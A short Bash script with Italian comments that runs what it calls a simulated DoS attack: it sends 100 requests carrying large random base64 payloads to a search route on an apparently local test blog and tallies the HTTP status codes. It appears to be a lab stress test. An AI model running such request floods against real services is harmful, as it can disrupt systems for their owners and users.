#!/bin/bash

# URL della rotta da attaccare
URL="http://cyber.blog:8000/articles/search"

#Svuota il file dei risultati prima di ogni lancio
> risultati.log

# Generare un grande payload casuale
LARGE_PAYLOAD=$(head -c 1000 < /dev/urandom | base64)

# Numero di richieste da inviare
NUM_REQUESTS=100

# Funzione per eseguire la richiesta
send_request() {
    curl -s -G "$URL" --data-urlencode "query=$LARGE_PAYLOAD" -o /dev/null -w "%{http_code}\n" >> risultati.log
}

echo "Inizio attacco DoS simulato..."

# Loop per inviare tante richieste
for ((i=1; i<=NUM_REQUESTS; i++))
do
    send_request 
    echo "Richiesta $i inviata"
done

wait
sort risultati.log | uniq -c



echo "Attacco DoS simulato completato!"
